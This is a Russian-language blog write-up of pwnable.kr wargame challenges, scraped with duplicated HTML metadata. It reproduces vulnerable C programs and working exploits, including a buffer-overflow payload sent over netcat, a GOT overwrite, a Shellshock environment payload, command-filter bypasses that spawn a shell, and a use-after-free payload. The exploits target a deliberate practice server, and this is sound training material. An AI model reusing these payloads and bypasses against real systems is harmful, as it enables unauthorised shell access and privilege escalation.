http://pwnable.kr/bin/bof Download: http://pwnable.kr/bin/bof.c Running at : nc pwnable.kr 9000 bof.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; void func(int key){ char overflowme[32]; printf(&quot;overflow me : &quot;); gets(overflowme); // smash me! if(key == 0xcafebabe){ system(&quot;/bin/sh&quot;); } else{ printf(&quot;Nah..\n&quot;); } } int main(int argc, char* argv[]){ func(0xdeadbeef); return 0; } Нужно перезаписать переменную на 0xcafebabe, находим в дебаггере правильный офсет, засылаем байты, cat’ом не даём stdout закрыться (python -c “print(&#39;A&#39;*52 + &#39;\xbe\xba\xfe\xca&#39;)&quot;; cat) | nc pwnable.kr 9000 daddy, I just pwned a buFFer :) flag Papa brought me a packed present! let’s open it. Download: http://pwnable.kr/bin/flag This is reversing task. all you need is binary strings flag PROT_EXEC|PROT_WRITE failed. $Info: This file is packed with the UPX executable packer http://upx.sf.net $ $Id: UPX 3.08 Copyright © 1996-2011 the UPX Team. All Rights Reserved. $ .\upx.exe -d .\flag UPX…? sounds like a delivery service :) passcode Mommy told me to make a passcode based login system. My initial C code was compiled without any error! Well, there was some compiler warning, but who cares about that? ssh passcode@pwnable.kr -p2222 (pw:guest) passcode.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; void login(){ int passcode1; int passcode2; printf(&quot;enter passcode1 : &quot;); scanf(&quot;%d&quot;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(&quot;enter passcode2 : &quot;); scanf(&quot;%d&quot;, passcode2); printf(&quot;checking...\n&quot;); if(passcode1==338150 &amp;amp;&amp;amp; passcode2==13371337){ printf(&quot;Login OK!\n&quot;); system(&quot;/bin/cat flag&quot;); } else{ printf(&quot;Login Failed!\n&quot;); exit(0); } } void welcome(){ char name[100]; printf(&quot;enter you name : &quot;); scanf(&quot;%100s&quot;, name); printf(&quot;Welcome %s!\n&quot;, name); } int main(){ printf(&quot;Toddler&#39;s Secure Login System 1.0 beta.\n&quot;); welcome(); login(); // something after login... printf(&quot;Now I can safely trust you that you have credential :)\n&quot;); return 0; } Отсутствие форматных символов в scanf’ах позволяет передать туда адреса и записать по ним, что нам нужно Где находятся переменные: name: [ebp-0x70] passcode1: [ebp-0x10] passcode2: [ebp-0xc] Но: char name[100]. passcode1 и passcode2 инты, каждый занимает 4 байта Считаем оффсет, passcode1 - name = 0x70 - 0x10 = 0x60 = 96 байт passcode1 занимает последние 4 байта массива name Заполняем массив до конца В последних 4-ёх байтах передаём адрес функции fflush из GOT - 0x0804a004 scanf’ом в функции login перезаписываем адрес fflush в GOT на код, когда уже проверки прошли и функцией system вызывается cat - 0x080485e3 (передаём его в десятичной 134514147) При вызове fflush исполнение перейдёт на нужную нам часть листинга gdb-peda$ x/x 0x0804a004 0x804a004 &lt;fflush@got.plt&gt;: 0x08048436 gdb-peda$ x/x 0x0804a004 0x804a004 &lt;fflush@got.plt&gt;: 0x080485e3 python -c &quot;print &#39;\x01&#39;*96 + &#39;\x04\xa0\x04\x08&#39; + &#39;134514147&#39;&quot; | ./passcode Sorry mom… I got confused about scanf usage :( random Daddy, teach me how to use random value in programming! ssh random@pwnable.kr -p2222 (pw:guest) random.c #include &lt;stdio.h&gt; int main(){ unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(&quot;%d&quot;, &amp;amp;key); if( (key ^ random) == 0xdeadbeef ){ printf(&quot;Good!\n&quot;); system(&quot;/bin/cat flag&quot;); return 0; } printf(&quot;Wrong, maybe you should try 2^32 cases.\n&quot;); return 0; } Не инициализирован сид для рандома (srand) Первое значение рандома в си без инициализации - 0x6b8b4567 key ^ 0x6b8b4567 == 0xdeadbeef –&gt; 0x6b8b4567 ^ 0xdeadbeef == 0xb526fb88 == 3039230856 Передаём в прогу это число 3039230856 random@pwnable:~$ echo -ne &quot;3039230856&quot; | ./random Good! Mommy, I thought libc random is unpredictable… input Mom? how can I pass my input to a computer program? ssh input2@pwnable.kr -p2222 (pw:guest) input.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;sys/socket.h&gt; #include &lt;arpa/inet.h&gt; int main(int argc, char* argv[], char* envp[]){ printf(&quot;Welcome to pwnable.kr\n&quot;); printf(&quot;Let&#39;s see if you know how to give input to program\n&quot;); printf(&quot;Just give me correct inputs then you will get the flag :)\n&quot;); // argv if(argc != 100) return 0; if(strcmp(argv[&#39;A&#39;],&quot;\x00&quot;)) return 0; if(strcmp(argv[&#39;B&#39;],&quot;\x20\x0a\x0d&quot;)) return 0; printf(&quot;Stage 1 clear!\n&quot;); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0; read(2, buf, 4); if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0; printf(&quot;Stage 2 clear!\n&quot;); // env if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0; printf(&quot;Stage 3 clear!\n&quot;); // file FILE* fp = fopen(&quot;\x0a&quot;, &quot;r&quot;); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0; fclose(fp); printf(&quot;Stage 4 clear!\n&quot;); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1){ printf(&quot;socket error, tell admin\n&quot;); return 0; } saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv[&#39;C&#39;]) ); if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0){ printf(&quot;bind error, use another port\n&quot;); return 1; } listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); if(cd &lt; 0){ printf(&quot;accept error, tell admin\n&quot;); return 0; } if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0; printf(&quot;Stage 5 clear!\n&quot;); // here&#39;s your flag system(&quot;/bin/cat flag&quot;); return 0; } python2 import subprocess import os import socket import time os.system(&quot;ln -s /home/input2/flag /tmp/tests4/flag&quot;) with open(&quot;/tmp/tests4/\x0a&quot;, &quot;w&quot;) as f: f.write(&quot;\x00\x00\x00\x00&quot;) stdin_r, stdin_w = os.pipe() stderr_r, stderr_w = os.pipe() args = [&#39;X&#39;] * 99 args[64] = &#39;&#39; args[65] = &quot;\x20\x0A\x0D&quot; args[66] = &quot;65005&quot; process = subprocess.Popen([&quot;/home/input2/input&quot;] + args, stdin=stdin_r, stderr=stderr_r, env={&quot;\xDE\xAD\xBE\xEF&quot;: &quot;\xCA\xFE\xBA\xBE&quot;}, cwd=&quot;/tmp/tests4/&quot;) os.write(stdin_w, &quot;\x00\x0A\x00\xFF&quot;) os.write(stderr_w, &quot;\x00\x0A\x02\xFF&quot;) time.sleep(3) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&quot;localhost&quot;, 65005)) s.sendall(&#39;\xDE\xAD\xBE\xEF&#39;) s.close() Mommy! I learned how to pass various input in Linux :) stroobants.dev/pwnablekr-series-input.html leg Daddy told me I should study arm. But I prefer to study my leg! Download: http://pwnable.kr/bin/leg.c Download: http://pwnable.kr/bin/leg.asm ssh leg@pwnable.kr -p2222 (pw:guest) leg.c #include &lt;stdio.h&gt; #include &lt;fcntl.h&gt; int key1(){ asm(&quot;mov r3, pc\n&quot;); } int key2(){ asm( &quot;push {r6}\n&quot; &quot;add r6, pc, $1\n&quot; &quot;bx r6\n&quot; &quot;.code 16\n&quot; &quot;mov r3, pc\n&quot; &quot;add r3, $0x4\n&quot; &quot;push {r3}\n&quot; &quot;pop {pc}\n&quot; &quot;.code 32\n&quot; &quot;pop {r6}\n&quot; ); } int key3(){ asm(&quot;mov r3, lr\n&quot;); } int main(){ int key=0; printf(&quot;Daddy has very strong arm! : &quot;); scanf(&quot;%d&quot;, &amp;key); if( (key1()+key2()+key3()) == key ){ printf(&quot;Congratz!\n&quot;); int fd = open(&quot;flag&quot;, O_RDONLY); char buf[100]; int r = read(fd, buf, 100); write(0, buf, r); } else{ printf(&quot;I have strong leg :P\n&quot;); } return 0; } leg.asm (gdb) disass main Dump of assembler code for function main: 0x00008d3c &lt;+0&gt;: push {r4, r11, lr} 0x00008d40 &lt;+4&gt;: add r11, sp, #8 0x00008d44 &lt;+8&gt;: sub sp, sp, #12 0x00008d48 &lt;+12&gt;: mov r3, #0 0x00008d4c &lt;+16&gt;: str r3, [r11, #-16] 0x00008d50 &lt;+20&gt;: ldr r0, [pc, #104] ; 0x8dc0 &lt;main+132&gt; 0x00008d54 &lt;+24&gt;: bl 0xfb6c &lt;printf&gt; 0x00008d58 &lt;+28&gt;: sub r3, r11, #16 0x00008d5c &lt;+32&gt;: ldr r0, [pc, #96] ; 0x8dc4 &lt;main+136&gt; 0x00008d60 &lt;+36&gt;: mov r1, r3 0x00008d64 &lt;+40&gt;: bl 0xfbd8 &lt;__isoc99_scanf&gt; 0x00008d68 &lt;+44&gt;: bl 0x8cd4 &lt;key1&gt; 0x00008d6c &lt;+48&gt;: mov r4, r0 0x00008d70 &lt;+52&gt;: bl 0x8cf0 &lt;key2&gt; 0x00008d74 &lt;+56&gt;: mov r3, r0 0x00008d78 &lt;+60&gt;: add r4, r4, r3 0x00008d7c &lt;+64&gt;: bl 0x8d20 &lt;key3&gt; 0x00008d80 &lt;+68&gt;: mov r3, r0 0x00008d84 &lt;+72&gt;: add r2, r4, r3 0x00008d88 &lt;+76&gt;: ldr r3, [r11, #-16] 0x00008d8c &lt;+80&gt;: cmp r2, r3 0x00008d90 &lt;+84&gt;: bne 0x8da8 &lt;main+108&gt; 0x00008d94 &lt;+88&gt;: ldr r0, [pc, #44] ; 0x8dc8 &lt;main+140&gt; 0x00008d98 &lt;+92&gt;: bl 0x1050c &lt;puts&gt; 0x00008d9c &lt;+96&gt;: ldr r0, [pc, #40] ; 0x8dcc &lt;main+144&gt; 0x00008da0 &lt;+100&gt;: bl 0xf89c &lt;system&gt; 0x00008da4 &lt;+104&gt;: b 0x8db0 &lt;main+116&gt; 0x00008da8 &lt;+108&gt;: ldr r0, [pc, #32] ; 0x8dd0 &lt;main+148&gt; 0x00008dac &lt;+112&gt;: bl 0x1050c &lt;puts&gt; 0x00008db0 &lt;+116&gt;: mov r3, #0 0x00008db4 &lt;+120&gt;: mov r0, r3 0x00008db8 &lt;+124&gt;: sub sp, r11, #8 0x00008dbc &lt;+128&gt;: pop {r4, r11, pc} 0x00008dc0 &lt;+132&gt;: andeq r10, r6, r12, lsl #9 0x00008dc4 &lt;+136&gt;: andeq r10, r6, r12, lsr #9 0x00008dc8 &lt;+140&gt;: ; &lt;UNDEFINED&gt; instruction: 0x0006a4b0 0x00008dcc &lt;+144&gt;: ; &lt;UNDEFINED&gt; instruction: 0x0006a4bc 0x00008dd0 &lt;+148&gt;: andeq r10, r6, r4, asr #9 End of assembler dump. (gdb) disass key1 Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;: add r11, sp, #0 0x00008cdc &lt;+8&gt;: mov r3, pc 0x00008ce0 &lt;+12&gt;: mov r0, r3 0x00008ce4 &lt;+16&gt;: sub sp, r11, #0 0x00008ce8 &lt;+20&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;: bx lr End of assembler dump. (gdb) disass key2 Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;: add r11, sp, #0 0x00008cf8 &lt;+8&gt;: push {r6} ; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;: add r6, pc, #1 0x00008d00 &lt;+16&gt;: bx r6 0x00008d04 &lt;+20&gt;: mov r3, pc 0x00008d06 &lt;+22&gt;: adds r3, #4 0x00008d08 &lt;+24&gt;: push {r3} 0x00008d0a &lt;+26&gt;: pop {pc} 0x00008d0c &lt;+28&gt;: pop {r6} ; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;: mov r0, r3 0x00008d14 &lt;+36&gt;: sub sp, r11, #0 0x00008d18 &lt;+40&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;: bx lr End of assembler dump. (gdb) disass key3 Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;: add r11, sp, #0 0x00008d28 &lt;+8&gt;: mov r3, lr 0x00008d2c &lt;+12&gt;: mov r0, r3 0x00008d30 &lt;+16&gt;: sub sp, r11, #0 0x00008d34 &lt;+20&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;: bx lr End of assembler dump. (gdb) hex(0x8ce4 + 0x8d0c + 0x8d80) &gt; Out[33]: &#39;0x1a770&#39; / $ ./leg Daddy has very strong arm! : 108400 Congratz! My daddy has a lot of ARMv5te muscle! mistake We all make mistakes, let’s move on. don’t take this too seriously, no fancy hacking skill is required at all) This task is based on real event Thanks to dhmonkey hint : operator priority ssh mistake@pwnable.kr -p2222 (pw:guest) mistake.c #include &lt;stdio.h&gt; #include &lt;fcntl.h&gt; #define PW_LEN 10 #define XORKEY 1 void xor(char* s, int len){ int i; for(i=0; i&lt;len; i++){ s[i] ^= XORKEY; } } int main(int argc, char* argv[]){ int fd; if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0){ printf(&quot;can&#39;t open password %d\n&quot;, fd); return 0; } printf(&quot;do not bruteforce...\n&quot;); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0)){ printf(&quot;read error\n&quot;); close(fd); return 0; } char pw_buf2[PW_LEN+1]; printf(&quot;input password : &quot;); scanf(&quot;%10s&quot;, pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN)){ printf(&quot;Password OK\n&quot;); system(&quot;/bin/cat flag\n&quot;); } else{ printf(&quot;Wrong Password\n&quot;); } close(fd); return 0; } В fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0 сначала выполняется правая часть, а в самом конце = (fd = (1 &lt; 0)) --&gt; false Поэтому по итогу в fd, из которого по идее мы читаем(где должен быть дескриптор файла password), лежит 0, читаем из stdin’а mistake@pwnable:~$ ./mistake do not bruteforce… @@@@@CCCCC input password : AAAAABBBBB Password OK Mommy, the operator priority always confuses me :( shellshock Mommy, there was a shocking news about bash. I bet you already know, but lets just make it sure :) ssh shellshock@pwnable.kr -p2222 (pw:guest) shellshock.c #include &lt;stdio.h&gt; int main(){ setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system(&quot;/home/shellshock/bash -c &#39;echo shock_me&#39;&quot;); return 0; } env x=&#39;() { :;}; /bin/cat flag&#39; ./shellshock only if I knew CVE-2014-6271 ten years ago…!! coin1 Mommy, I wanna play a game! (if your network response time is too slow, try nc 0 9007 inside pwnable.kr server) Running at : nc pwnable.kr 9007 --------------------------------------------------- - Shall we play a game? - --------------------------------------------------- You have given some gold coins in your hand however, there is one counterfeit coin among them counterfeit coin looks exactly same as real coin however, its weight is different from real one real coin weighs 10, counterfeit coin weighes 9 help me to find the counterfeit coin with a scale if you find 100 counterfeit coins, you will get reward :) FYI, you have 60 seconds. - How to play - 1. you get a number of coins (N) and number of chances (C) 2. then you specify a set of index numbers of coins to be weighed 3. you get the weight information 4. 2~3 repeats C time, then you give the answer - Example - [Server] N=4 C=2 # find counterfeit among 4 coins with 2 trial [Client] 0 1 # weigh first and second coin [Server] 20 # scale result : 20 [Client] 3 # weigh fourth coin [Server] 10 # scale result : 10 [Client] 2 # counterfeit coin is third! [Server] Correct! - Ready? starting in 3 sec... - Бинарная сиртировка тупа Ну чё, посортируем from pwn import * # For SSHing in, and then running locally # s = ssh(host=&quot;pwnable.kr&quot;, user=&quot;fd&quot;, port=2222, password=&quot;guest&quot;) # conn = s.remote(&#39;localhost&#39;, 9007) # For running remotely #conn = remote(&#39;pwnable.kr&#39;, 9007) # For running locally on pwnable.kr # Всё оч медленно, поэтому, кроме как подконнектиться и запустить локально, вариков нет conn = remote(&#39;localhost&#39;, 9007) conn.recvuntil(&#39;Ready? starting in 3 sec&#39;) conn.recvline() conn.recvline() for _ in range(100): line = conn.recvline().decode(&#39;utf-8&#39;).strip().split(&#39; &#39;) # [u&#39;N=317&#39;, u&#39;C=9&#39;] # print line n = int(line[0].split(&#39;=&#39;)[1]) # 317 c = int(line[1].split(&#39;=&#39;)[1]) # 9 start = 0 end = n - 1 for _ in range(c): mid = int((start + end)/2) # cast to ensure only whole numbers # print(&#39;start: &#39;+str(start)) # print(&#39;mid: &#39;+str(mid)) # print(&#39;end: &#39;+str(end)) guess = &#39; &#39;.join(str(i) for i in range(start, mid + 1)) # print guess conn.sendline(guess) weight = int(conn.recvline()) # print weight if weight % 10 == 0: # if divisible by 10, then no counterfeit in list start = mid + 1 else: # counterfeit in list end = mid conn.sendline(str(start)) # send final guess print(conn.recvline()) # Correct! (n) print(conn.recvline()) # Congrats! get your flag print(conn.recvline()) # {actual flag} conn.close() b1NaRy_S34rch1nG_1s_3asy_p3asy код отсюда blackjack Hey! check out this C implementation of blackjack game! I found it online http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html I like to give my flags to millionares. how much money you got? Running at : nc pwnable.kr 9009 Видим код и реализацию betting int betting() //Asks user amount to bet { printf(&quot;\n\nEnter Bet: $&quot;); scanf(&quot;%d&quot;, &amp;bet); if (bet &gt; cash) //If player tries to bet more money than player has { printf(&quot;\nYou cannot bet more money than you have.&quot;); printf(&quot;\nEnter Bet: &quot;); scanf(&quot;%d&quot;, &amp;bet); return bet; } else return bet; Всего лишь два прохода, на втором нет проверки bet &gt; cash 2 варианта: 1) Ввести сначала чисто больше 500 –&gt; попадаем в if 2) Вводим число очень большое 2147483047 3) Выигрываем в партии –&gt; профит 1) Вводим отрицательное число –&gt; - - = + 2) Проигрываем YaY_I_AM_A_MILLIONARE_LOL lotto Mommy! I made a lotto program for my homework. do you want to play? ssh lotto@pwnable.kr -p2222 (pw:guest) #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;fcntl.h&gt; unsigned char submit[6]; void play(){ int i; printf(&quot;Submit your 6 lotto bytes : &quot;); fflush(stdout); int r; r = read(0, submit, 6); printf(&quot;Lotto Start!\n&quot;); //sleep(1); // generate lotto numbers int fd = open(&quot;/dev/urandom&quot;, O_RDONLY); if(fd==-1){ printf(&quot;error. tell admin\n&quot;); exit(-1); } unsigned char lotto[6]; if(read(fd, lotto, 6) != 6){ printf(&quot;error2. tell admin\n&quot;); exit(-1); } for(i=0; i&lt;6; i++){ lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 } close(fd); // calculate lotto score int match = 0, j = 0; for(i=0; i&lt;6; i++){ for(j=0; j&lt;6; j++){ if(lotto[i] == submit[j]){ match++; } } } // win! if(match == 6){ system(&quot;/bin/cat flag&quot;); } else{ printf(&quot;bad luck...\n&quot;); } } void help(){ printf(&quot;- nLotto Rule -\n&quot;); printf(&quot;nlotto is consisted with 6 random natural numbers less than 46\n&quot;); printf(&quot;your goal is to match lotto numbers as many as you can\n&quot;); printf(&quot;if you win lottery for *1st place*, you will get reward\n&quot;); printf(&quot;for more details, follow the link below\n&quot;); printf(&quot;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;); printf(&quot;mathematical chance to win this game is known to be 1/8145060.\n&quot;); } int main(int argc, char* argv[]){ // menu unsigned int menu; while(1){ printf(&quot;- Select Menu -\n&quot;); printf(&quot;1. Play Lotto\n&quot;); printf(&quot;2. Help\n&quot;); printf(&quot;3. Exit\n&quot;); scanf(&quot;%d&quot;, &amp;menu); switch(menu){ case 1: play(); break; case 2: help(); break; case 3: printf(&quot;bye\n&quot;); return 0; default: printf(&quot;invalid menu\n&quot;); break; } } return 0; } Проверяется один байт рандома с 6-ью байтами инпута, занчит все байты инпута должны быть одинаковыми, пишем скрипт и надеемся на рандом! Диапазон от 1 до 45 from pwn import * sh = ssh(&#39;lotto&#39;, &#39;pwnable.kr&#39;, password=&#39;guest&#39;, port=2222) p = sh.process(&#39;./lotto&#39;) for i in range(1000): p.recv() p.sendline(&#39;1&#39;) p.recv() p.sendline(&#39;------&#39;) _ , ans = p.recvlines(2) if &quot;bad&quot; not in ans: print(ans) break sorry mom… I FORGOT to check duplicate numbers… :( cmd1 Mommy! what is PATH environment in Linux? ssh cmd1@pwnable.kr -p2222 (pw:guest) cmd1.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; int filter(char* cmd){ int r=0; r += strstr(cmd, &quot;flag&quot;)!=0; r += strstr(cmd, &quot;sh&quot;)!=0; r += strstr(cmd, &quot;tmp&quot;)!=0; return r; } int main(int argc, char* argv[], char** envp){ putenv(&quot;PATH=/thankyouverymuch&quot;); if(filter(argv[1])) return 0; system( argv[1] ); return 0; } Notice the difference between single quotes and double quotes in argv: $ ./test &#39;$(echo abc)&#39; argv[1] = $(echo abc) $ ./test &quot;$(echo abc)&quot; argv[1] = abc Single quotes pass the command without executing it. Double quotes executes the command then passes its output (cannot pass the filter). ./cmd1 &#39;$(printf &quot;/bin/%s%s&quot; &quot;s&quot; &quot;h&quot;)&#39; /bin/cat /home/cmd1/flag mommy now I get what PATH environment is for :) cmd2 Daddy bought me a system command shell. but he put some filters to prevent me from playing with it without his permission… but I wanna play anytime I want! ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1) #include &lt;stdio.h&gt; #include &lt;string.h&gt; int filter(char* cmd){ int r=0; r += strstr(cmd, &quot;=&quot;)!=0; r += strstr(cmd, &quot;PATH&quot;)!=0; r += strstr(cmd, &quot;export&quot;)!=0; r += strstr(cmd, &quot;/&quot;)!=0; r += strstr(cmd, &quot;`&quot;)!=0; r += strstr(cmd, &quot;flag&quot;)!=0; return r; } extern char** environ; void delete_env(){ char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p)); } int main(int argc, char* argv[], char** envp){ delete_env(); putenv(&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;); if(filter(argv[1])) return 0; printf(&quot;%s\n&quot;, argv[1]); system( argv[1] ); return 0; } ./cmd2 &#39;$(printf &quot;%bbin%bbash -p&quot; &quot;\57&quot; &quot;\57&quot;)&#39; (и гениальное) ./cmd2 &#39;$(read x; echo $x)&#39; FuN_w1th_5h3ll_v4riabl3s_haha uaf Mommy, what is Use After Free bug? ssh uaf@pwnable.kr -p2222 (pw:guest) #include &lt;fcntl.h&gt; #include &lt;iostream&gt; #include &lt;cstring&gt; #include &lt;cstdlib&gt; #include &lt;unistd.h&gt; using namespace std; class Human{ private: virtual void give_shell(){ system(&quot;/bin/sh&quot;); } protected: int age; string name; public: virtual void introduce(){ cout &lt; &quot;My name is &quot; &lt; name &lt; endl; cout &lt; &quot;I am &quot; &lt; age &lt; &quot; years old&quot; &lt; endl; } }; class Man: public Human{ public: Man(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt; &quot;I am a nice guy!&quot; &lt; endl; } }; class Woman: public Human{ public: Woman(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt; &quot;I am a cute girl!&quot; &lt; endl; } }; int main(int argc, char* argv[]){ Human* m = new Man(&quot;Jack&quot;, 25); Human* w = new Woman(&quot;Jill&quot;, 21); size_t len; char* data; unsigned int op; while(1){ cout &lt; &quot;1. use\n2. after\n3. free\n&quot;; cin &gt; op; switch(op){ case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt; &quot;your data is allocated&quot; &lt; endl; break; case 3: delete m; delete w; break; default: break; } } return 0; } python -c &#39;print (&quot;\x68\x15\x40\x00\x00\x00\x00\x00&quot;)&#39; &gt; /tmp/ihcuaf ./uaf 24 /tmp/ihcuaf 3 2 2 1 cat flag yay_f1ag_aft3r_pwning https://gist.github.com/ihciah/3c157f18f49bd2287470 https://medium.com/@c0ngwang/pwnable-kr-writeup-uaf-4cb8ba851472 memcpy asm unlink blukat horcruxes" />
<meta property="og:site_name" content="Windows Internals Blog" />
<meta property="og:image" content="/assets/previews/12.jpg" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-09-28T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="/assets/previews/12.jpg" />
<meta property="twitter:title" content="pwnable.kr [ru]" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"truebad0ur"},"dateModified":"2022-09-28T00:00:00+00:00","datePublished":"2022-09-28T00:00:00+00:00","description":"fd Mommy! what is a file descriptor in Linux? try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://youtu.be/971eZhMHQQw ssh fd@pwnable.kr -p2222 (pw:guest) fd.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc&lt;2){ printf(&quot;pass argv[1] a number\\n&quot;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\\n&quot;, buf)){ printf(&quot;good job :)\\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); } printf(&quot;learn about Linux file IO\\n&quot;); return 0; } Хотим получить stdin –&gt; всё просто: 0x1234 - X = 0 –&gt; x = 4660 ./fd 4660 LETMEWIN &gt; good job :) &gt; mommy! I think I know what a file descriptor is!! collision Daddy told me about cool MD5 hash collision today. I wanna do something like that too! ssh col@pwnable.kr -p2222 (pw:guest) col.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++){ res += ip[i]; } return res; } int main(int argc, char* argv[]){ if(argc&lt;2){ printf(&quot;usage : %s [passcode]\\n&quot;, argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(&quot;passcode length should be 20 bytes\\n&quot;); return 0; } if(hashcode == check_password( argv[1] )){ system(&quot;/bin/cat flag&quot;); return 0; } else printf(&quot;wrong passcode.\\n&quot;); return 0; } Вводится 20 символов, рабиваем их по 4: AAAA AAAA AAAA AAAA AAAA Суммируем, равенство должно выполняться: 0x41414141 + 0x41414141 + 0x41414141 + 0x41414141 + 0x41414141 = 0x21DD09EC Подгоняем числа, выходит: 0x6c5cec8 + 0x6c5cec8 + 0x6c5cec8 + 0x6c5cec8 + 0x6c5cecc ./col $(python -c &quot;print(&#39;\\xc8\\xce\\xc5\\x06&#39; * 4 + &#39;\\xcc\\xce\\xc5\\x06&#39;)&quot;) daddy! I just managed to create a hash collision :) bof Nana told me that buffer overflow is one of the most common software vulnerability. Is that true? Download: http://pwnable.kr/bin/bof Download: http://pwnable.kr/bin/bof.c Running at : nc pwnable.kr 9000 bof.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; void func(int key){ char overflowme[32]; printf(&quot;overflow me : &quot;); gets(overflowme); // smash me! if(key == 0xcafebabe){ system(&quot;/bin/sh&quot;); } else{ printf(&quot;Nah..\\n&quot;); } } int main(int argc, char* argv[]){ func(0xdeadbeef); return 0; } Нужно перезаписать переменную на 0xcafebabe, находим в дебаггере правильный офсет, засылаем байты, cat’ом не даём stdout закрыться (python -c “print(&#39;A&#39;*52 + &#39;\\xbe\\xba\\xfe\\xca&#39;)&quot;; cat) | nc pwnable.kr 9000 daddy, I just pwned a buFFer :) flag Papa brought me a packed present! let’s open it. Download: http://pwnable.kr/bin/flag This is reversing task. all you need is binary strings flag PROT_EXEC|PROT_WRITE failed. $Info: This file is packed with the UPX executable packer http://upx.sf.net $ $Id: UPX 3.08 Copyright © 1996-2011 the UPX Team. All Rights Reserved. $ .\\upx.exe -d .\\flag UPX…? sounds like a delivery service :) passcode Mommy told me to make a passcode based login system. My initial C code was compiled without any error! Well, there was some compiler warning, but who cares about that? ssh passcode@pwnable.kr -p2222 (pw:guest) passcode.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; void login(){ int passcode1; int passcode2; printf(&quot;enter passcode1 : &quot;); scanf(&quot;%d&quot;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(&quot;enter passcode2 : &quot;); scanf(&quot;%d&quot;, passcode2); printf(&quot;checking...\\n&quot;); if(passcode1==338150 &amp;amp;&amp;amp; passcode2==13371337){ printf(&quot;Login OK!\\n&quot;); system(&quot;/bin/cat flag&quot;); } else{ printf(&quot;Login Failed!\\n&quot;); exit(0); } } void welcome(){ char name[100]; printf(&quot;enter you name : &quot;); scanf(&quot;%100s&quot;, name); printf(&quot;Welcome %s!\\n&quot;, name); } int main(){ printf(&quot;Toddler&#39;s Secure Login System 1.0 beta.\\n&quot;); welcome(); login(); // something after login... printf(&quot;Now I can safely trust you that you have credential :)\\n&quot;); return 0; } Отсутствие форматных символов в scanf’ах позволяет передать туда адреса и записать по ним, что нам нужно Где находятся переменные: name: [ebp-0x70] passcode1: [ebp-0x10] passcode2: [ebp-0xc] Но: char name[100]. 